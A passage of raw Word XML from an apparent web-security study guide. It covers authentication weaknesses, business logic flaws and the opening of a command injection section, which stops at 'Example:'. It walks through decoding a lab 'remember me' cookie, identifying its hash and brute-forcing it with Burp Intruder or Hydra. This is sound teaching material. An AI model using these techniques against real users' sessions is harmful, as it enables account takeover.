          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Resetting passwords by mail</w:t>
      </w:r>
      <w:r>
        <w:t>: sending a temporary password to a user's email addr</w:t>
      </w:r>
      <w:r>
        <w:t>ess.  Email is considered insecure and there is a risk of that email being intercepted.  Only provide high-entropy password reset links by email.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Keeping users logged in</w:t>
      </w:r>
      <w:r>
        <w:t>: relies on using a cookie.  If the cookie is insecure, an attacker can guess how to re</w:t>
      </w:r>
      <w:r>
        <w:t>create it or alter a cookie for their own account to login as another user.  This can be mitigated by second factor verification.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Keeping users logged in</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>remember me</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie will include a value that can be used to authenticate the user.  As a result, it's susceptible to brute forcing if you can determine how the cookie value is generated.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t># Remember me cookie example</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>M2Q0M2E2MDExZTllYmJhNmNhNzcw;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Burp Proxy will automatically recognize the value as a base64 encoded string or you can decode it yourself:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t># Decode the cookie value</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>weiner</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>:51dc30ddc473d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>43a6011e9ebba6ca770</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>You can then use the following tools to determine the hash type and check the result for a known value:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t># Identify hash type</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>hashid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> -m "$HASH"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>hash-identifier "$HASH"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"># Generate a hash of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>differnt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> types to compare against a known hashe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>d value.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>The</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> `-n` is required to prevent printing the newline character</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t># which would alter the hash returned.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>echo</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> -n "foo" | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>openssl</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dgst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> -md5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">echo -n "bar" | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>openssl</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dgst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> -sha256</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Once you know the hashing, you can begin brute forcing the hashed value </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">using </w:t>
      </w:r>
      <w:hyperlink r:id="rId29" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Intruder (view solution)</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId30" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Hydra</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId31" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Intruder</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/authentication</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/authentication/password-based</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:sectPr w:rsidR="00B3581B">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigge</w:t>
      </w:r>
      <w:r>
        <w:t>r.net/web-security/authentication/securing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Business logic </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>vulnerabilities :bug</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Flaws and bugs in how an application processes user requests.  These are typically caused by an attacker interacting with the application in a way the developers did not antici</w:t>
      </w:r>
      <w:r>
        <w:t>pate.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Examples</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Excessive trust in client-side controls</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Assuming that requests will only come through the user interface and be subjected to client-side validation.  Easily bypassed by tools like Burp Suite.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Failing to handle unconventional input</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Bugs trigg</w:t>
      </w:r>
      <w:r>
        <w:t>ered by receiving user input that is not of the expected type or within the expected range (e.g. a negative number when only positive values are expected).  This must be caught with input and business logic validation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Making flawed assumptions about user </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>behavior</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Assuming that users will interact predictably.  This can include:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Not following an expected workflow sequence;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Not providing all required input; and</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Not remaining trustworthy after initial authentication.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Providing an encryption oracle</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Occurs when</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> user provided input is then returned as cipher text to the user.  This can allow the attacker to determine the encryption algorithm and key used by the application.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tips</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Look for all requests that submit input to the server and check if there is adequate </w:t>
      </w:r>
      <w:r>
        <w:t>server-side validation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Submit input that satisfies validation, but is outside of expected ranges (e.g. negative numbers in a scenario where they do not make sense).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Attempt to bypass sections of workflows (skip ahead to the end).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Make sure all dev</w:t>
      </w:r>
      <w:r>
        <w:t>elopers and testers understand the application logic.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Validate all user inputs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Write clear, simple code that is easy to understand and test.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Break complex logic into smaller, simpler functions and ensure each function is thoroughly tested.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId32" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Proxy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId33" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Repeater</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId34" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>BApp</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> Store &gt; </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Hackvertor</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/logic-flaws</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:sectPr w:rsidR="00B3581B">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/logic-flaws/examples</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Command </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>injection :syringe</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Allow an attacker to execute OS commands on the server.  Occurs when a </w:t>
      </w:r>
      <w:r>
        <w:t>user's input is passed to a shell command without sufficient sanitization.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
